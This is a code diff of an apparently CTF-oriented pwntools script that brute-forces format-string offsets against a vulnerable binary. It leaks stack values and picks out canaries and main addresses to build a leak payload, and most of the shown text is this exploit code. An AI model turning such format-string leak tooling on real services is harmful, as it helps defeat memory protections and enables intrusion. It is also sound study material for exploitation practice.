@@ -6,11 +6,12 @@ global BINARY
 #=====[ Target Segment ]=====#
 SERV = 'thpctf.th'
 PORT = 6767
-REMOTE = True
 BINARY = './vuln' 
+TOINDEX = 64
 #============================#
 elf = context.binary = ELF(BINARY)
 # context.log_level = "error"  #aktifkan jika gamau liat info log
+REMOTE = True
 
 def start():
     global REMOTE
@@ -29,7 +30,7 @@ def start():
 
 def indexl():
     main = hex(elf.sym.main)
-    targ = 512
+    global TOINDEX
 
     payload = ''
     log = ''
@@ -39,7 +40,7 @@ def indexl():
 
     while True:
         i += 1
-        pay = f"AAAABBBB%{i}$p"
+        pay = f"AAAABBBB%{i}$p:%{i+(TOINDEX//2)}$p"
         p = start()
 
             #===[ sendline segment 1 ]===#
@@ -49,51 +50,60 @@ def indexl():
             #===[ recvline segment 1 ]===#
         p.recvuntil(b'BBBB')
         try:
-            leak = int(p.recvline().strip().decode(),16)
-            leaked += f'\n{text.green(f'index {i :<5}')} : {text.bold_yellow(hex(leak))}'
+            rax = p.recvline().strip().decode().split(':')
+            leak = int(rax[0],16)
+            leak1 = int(rax[1],16)
 
-            leak = str(hex(leak))
-
-            #==========[ START INDEX ]==========#
-            if '424242' in leak:
-                log += f'\n{"":<2}{'start input':<15}{i:<15}{leak:<20}{unhex(leak.replace('0x',''))}'
-                payload += f'.%{i}$p'
+            l_indx = f'index {i:<5}'
+            l_val  = f'{hex(leak):<20}'
+           
+            r_indx = f'index {i+(TOINDEX//2):<5}'
+            r_val  = f'{hex(leak1):<20}'
             
-            #==========[ BASE ]==========#
-            # if leak[-3:] == '000':
-            #     log += f"\n{'':<2}{'Base':<15}{i:<15}{leak}"
-            #     payload += f'.%{i}$p'
+            l_side = f'{text.bold_green(l_indx)}{text.bold_yellow(l_val)}'
+            r_side = f'{text.bold_green(r_indx)}{text.bold_yellow(r_val)}'
 
-            #==========[ PIE ]==========#
-            # if leak.startswith(('0x4','0x5','0x6')):
-            #     log += f"\nfound PIE : {i} : {leak}"
-            #     payload += f'.%{i}$p'
+            leaked += f'\n{l_side} {'|':<10} {r_side}'
 
-            #==========[ CANARY ]==========#
-            if leak[-2::] == '00' and len(leak) == 18:
-                log += f"\n{'':<2}{text.bold_red('canary'):<23}{i:<15}{text.bold_yellow(leak)}"
+            for val,idx in ((leak, i) , (leak1, i + (TOINDEX//2))):
+                log_entry , payload_entry = filtering(val,idx)
+                if log_entry:
+                    log += log_entry 
+                if payload_entry:
+                    payload += payload_entry
+            
+            #leaked += f'\n{text.green(f'index {i :<5}')} : {text.bold_yellow(hex(leak))} {'':<15}{'|':<15} {text.green(f'index {i+(TOINDEX//2) :<5}')} : {text.bold_yellow(hex(leak1))}'
 
-            #==========[ MAIN / BASE ]==========#
-            if leak.endswith(main[-3:]):
-                log += f"\n{'':<2}{text.green('Main'):<23}{i:<15}{text.bold_yellow(leak)}"
-                payload += f'.%{i}$p'
-                calculated_base = int(leak,16) - elf.sym.main
-                log += f"\n{'':<2}{text.green('BASE (calc)'):<23}{'-':<15}{text.bold_yellow(hex(calculated_base))}"
+            # leak = str(hex(leak))
+
         except:
             p.close()
     
-        if i == targ:
+        if i == (TOINDEX//2):
             break
     
         p.close()
+
     log += f'\n{text.red('='*50)}'
     log += f'\n{text.bold_green("FORMAT STRING PAYLOAD  :")}'
     log += f'\n{text.bold_yellow(payload)}'
     log += f'\n{text.bold_red('='*50)}'
     print(leaked)
     print(log)
-    
 
+def filtering(leak,i):
+    log_entry = ""
+    payload_entry = ""
+
+    leak_hex = hex(leak)
+
+    #==========[ CANARY ]==========#
+    if leak_hex.endswith('00') and len(leak_hex) >= 16:
+        log_entry += f"\n{'':<2}{text.red('canary'):<23}{i:<15}{text.bold_yellow(leak_hex)}"
+        payload_entry += f'%{i}$p.'
+
+    print(repr(leak_hex), len(leak_hex))
+    return log_entry,payload_entry
 
 def main():
     p = log.progress('See Index Tools')
